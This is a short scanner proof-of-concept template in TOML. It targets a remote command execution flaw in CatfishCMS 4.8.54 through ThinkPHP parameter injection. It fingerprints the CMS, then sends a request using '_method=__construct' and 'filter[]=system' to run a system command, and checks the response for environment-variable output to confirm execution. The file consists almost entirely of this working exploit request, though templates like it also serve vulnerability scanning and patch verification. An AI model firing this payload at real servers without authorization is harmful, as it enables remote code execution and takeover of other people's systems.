[info]
id = "POC-AVE-2026-0030"
name = "CatfishCMS 4.8.54 Remote Command Execution PoC"
author = "AVE"
severity = "critical"
tags = ["rce", "command-injection", "thinkphp"]
description = "CatfishCMS 4.8.54 存在远程命令执行漏洞，通过 ThinkPHP 参数注入（_method=__construct + filter[]=system）实现任意系统命令执行"
vuln_id = ["CNVD-2019-06255", "AVE-2026-0030"]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["content=\"Catfish CMS"]
expect = true

[[poc.requests]]
method = "GET"
path = "/s=set&_method=__construct&method=*&filter[]=system"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["OS", "PATH", "SHELL", "USER"]
condition = "and"
expect = true

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true
